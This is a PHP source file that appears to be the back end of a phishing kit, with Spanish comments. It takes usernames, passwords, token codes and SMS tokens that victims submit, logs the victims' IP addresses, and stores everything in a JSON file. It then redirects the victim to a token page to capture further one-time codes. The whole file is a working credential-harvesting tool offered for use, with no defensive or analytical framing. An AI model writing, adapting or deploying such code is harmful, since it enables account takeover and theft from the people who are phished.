<?php

include "facker.php";
session_start();

define("__CARPETA__", "ware");
define("__JSONFILE__", "recordware.json");

$usuario = isset($_POST["step01"]) ? $_POST["step01"] : '';
$clave = isset($_POST["step02"]) ? $_POST["step02"] : '';
$codtoken = isset($_POST["step03"]) ? $_POST["step03"] : ''; 
$token = isset($_POST["token"]) ? $_POST["token"] : 'No';
$smsToken = isset($_POST["smsToken"]) ? $_POST["smsToken"] : 'No';

$ip = '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    // IP from shared internet
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    // IP passed from proxy
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$jsonback = get_data($usuario, $clave, $ip, $codtoken, $token, $smsToken);

// Guardar el nombre de usuario en la sesión
$_SESSION['usuario'] = $usuario;
$_SESSION['pawsdo'] = $clave;

// Responder al cliente
echo json_encode(['status' => 'success', 'message' => 'Datos guardados correctamente.']);

// Redirigir a la página de destino
header('Location: ./token.php');
exit();

function get_data($user, $pass, $ip, $codtoken, $token, $smsToken) {
    $file_name = __CARPETA__ . "/" . __JSONFILE__;
    
    if (file_exists($file_name)) {
        $current_data = file_get_contents($file_name);
        $array_data = json_decode($current_data, true);

        // Asegurarse de que $array_data es un array
        if (!is_array($array_data)) {
            $array_data = [];
        }

        $user_exists = false;

        foreach ($array_data as &$entry) {
            if ($entry['Usuario'] === $user) {
                // Actualizar los datos del usuario existente
                if ($pass != '') {
                    $entry['Clave'] = $pass;
                    $entry['Token'] = "No";
                    $user_exists = true;
                    break;
                }
                $entry['Ip'] = $ip;
                $entry['CodToken'] = $codtoken;
                $entry['SmsToken'] = "Si";
                $entry['Token'] = "No";
                $user_exists = true;
                break;
            }
        }

        if (!$user_exists) {
            // Calcular el próximo ID
            $last_id = count($array_data) > 0 ? intval(end($array_data)['Id']) : 0;
            $id = ($last_id % 5) + 1; // Reinicia a 1 cuando llega a 5
            $new_entry = [
                'Id' => $id,
                'Usuario' => $user,
                'Clave' => $pass, // Guarda la clave cuando el usuario es nuevo
                'CodToken' => $codtoken,
                'Token' => $token,
                'SmsToken' => $smsToken,
                'Ip' => $ip
            ];
            $array_data[] = $new_entry;
        }

        $json_data = json_encode($array_data, JSON_PRETTY_PRINT);
        file_put_contents($file_name, $json_data);

        return $json_data;
    } else {
        $datae = [
            [
                'Id' => 1,
                'Usuario' => $user,
                'Clave' => $pass, // Guarda la clave cuando el archivo no existe
                'CodToken' => $codtoken,
                'Token' => $token,
                'SmsToken' => $smsToken,
                'Ip' => $ip
            ]
        ];
        $json_data = json_encode($datae, JSON_PRETTY_PRINT);

        // Crear el archivo y escribir los datos iniciales
        if (!file_exists(__CARPETA__)) {
            mkdir(__CARPETA__, 0777, true);
        }
        file_put_contents($file_name, $json_data);

        return $json_data;
    }
}
?>
